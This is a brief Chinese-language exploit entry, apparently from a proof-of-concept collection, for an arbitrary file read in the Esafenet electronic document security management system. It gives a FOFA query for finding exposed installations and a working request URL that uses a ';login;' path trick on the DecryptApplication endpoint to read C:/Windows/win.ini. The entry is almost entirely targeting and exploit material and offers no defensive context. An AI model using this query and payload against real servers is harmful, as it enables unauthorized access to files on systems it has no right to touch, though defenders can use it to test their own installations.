## 亿赛通电子文档安全管理系统DecryptApplication存在任意文件读取漏洞

## fofa
```
app="亿赛通电子文档安全管理系统"
```

## poc
```
http://ip/CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:///Windows/win.ini&uploadFileId=1&fileName1=test1111
```
